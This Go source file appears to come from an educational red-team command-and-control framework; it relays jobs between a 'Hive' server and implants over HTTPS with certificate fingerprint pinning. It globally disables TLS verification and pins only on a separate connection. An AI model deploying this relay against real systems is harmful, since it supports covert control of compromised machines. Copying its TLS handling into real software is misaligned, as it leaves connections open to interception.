//{{{{{{{ Redirector Hive Coms }}}}}}}

//// Every Function that Hives use to Communicate with the Hive
// A. hiveConnection
// B. redChecking
// C. hiveComs


//By Rebujacker - Alvaro Folgado Rueda as an open source educative project
package main

import (
	"fmt"
    "net/http"
    "crypto/tls"
    "encoding/json"
    "bytes"
    "net/http/httputil"
    "strings"
    "io/ioutil"
	"encoding/hex"
	"crypto/sha256"
	"net"
	"time"
)



func connectHive(){
	
	//Get Any Jobs from Bots targeting this redirector
	getHive()
	
	//Lock shared Slice
	jobsToHive.mux.Lock()
	defer jobsToHive.mux.Unlock()

	j := 0
	for i,_ := range jobsToHive.Jobs {
		postHive(jobsToHive.Jobs[i])
	}
	jobsToHive.Jobs = jobsToHive.Jobs[:j]

}


func getHive(){

	var newJobs []*Job
	
	result := checkTLSignature()
	if result != "Good"{
		return
	}

	//Bypass unsecure self-signed certificate
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	client := &http.Client{}
	req, _ := http.NewRequest("GET", "https://"+redconfig.Roaster+"/red", nil)
	req.Header.Set("Authorization", authbearer)
	res, err := client.Do(req)
	if err != nil {
		addLog("Hive Get Error" + err.Error())
		return
	}

    decoder := json.NewDecoder(res.Body)
    err = decoder.Decode(&newJobs)
	if err != nil {
		addLog("Hive Get Error"+err.Error())
		return
	}

	//Mutex to avoid Race Conditions
	jobsToBichito.mux.Lock()
	defer jobsToBichito.mux.Unlock()

    jobsToBichito.Jobs = append(jobsToBichito.Jobs,newJobs...)

	//Debug
	requestDump, err2 := httputil.DumpResponse(res, true)
	if err2 != nil {
  		fmt.Println(err2.Error())
	}
	fmt.Println(string(requestDump))

}


func postHive(job *Job){

	result := checkTLSignature()
	if result != "Good"{
		return
	}
	
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	
	//Serialize Job, and send it to Hive
	bytesRepresentation, err := json.Marshal(job)
	if err != nil {
		addLog("POST:Job json encoding Error"+err.Error())
		return
	}

	client := &http.Client{}
	req, _ := http.NewRequest("POST", "https://"+redconfig.Roaster+"/red",bytes.NewBuffer(bytesRepresentation))
	req.Header.Set("Authorization", authbearer)
	_, err = client.Do(req)
	if err != nil {
		addLog("Post error"+err.Error())
		return
	}


	//Debug

	requestDump, err2 := httputil.DumpRequest(req, true)
	if err2 != nil {
  		fmt.Println(err)
	}
	fmt.Println(string(requestDump))

    fmt.Println("Body: "+string(bytesRepresentation))

}


func checking() string{

	result := checkTLSignature()
	if result != "Good"{
		return "Bad TLS"
	}
	//Bypass unsecure self-signed certificate
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	client := &http.Client{}
	req, _ := http.NewRequest("GET", "https://"+redconfig.Roaster+"/checking", nil)
	req.Header.Set("Authorization", authbearer)
	res, err := client.Do(req)
	if err != nil {
		return "Not able to connect Hive on"+ redconfig.Roaster +"with Error:"+err.Error()
	}
	body, err2 := ioutil.ReadAll(res.Body)
	if err2 != nil {
		return "Bad CHecking Body Decoding"
	}
	//Debug CHecking
	requestDump, err2 := httputil.DumpResponse(res, true)
	if err2 != nil {
  		fmt.Println(err2)
	}
	fmt.Println(string(requestDump))

	return string(body)

}



//This two functions check the Hive Certificate signature to make sure it is the Hive we have installed
func checkTLSignature() string{

	var conn net.Conn
	fprint := strings.Replace(redconfig.HiveFingenprint, ":", "", -1)
	bytesFingerprint, err := hex.DecodeString(fprint)
	if err != nil {
		return "Hive TLS Error,fingenprint decoding"+err.Error()
	}
	
	config := &tls.Config{InsecureSkipVerify: true}
	
	if conn,err = net.DialTimeout("tcp", redconfig.Roaster,1 * time.Second); err != nil{
		return "Hive TLS Error,Hive not reachable"+err.Error()
	}	
	
	tls := tls.Client(conn,config)
	tls.Handshake()

	if ok,err := CheckKeyPin(tls, bytesFingerprint); err != nil || !ok {
		return "Hive TLS Error,Hive suplantation?"
	}

	return "Good"


}

func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool,error) {
	valid := false
	connState := conn.ConnectionState() 
	for _, peerCert := range connState.PeerCertificates { 
			hash := sha256.Sum256(peerCert.Raw)
			if bytes.Compare(hash[0:], fingerprint) == 0 {

				valid = true
			}
	}
	return valid, nil
}

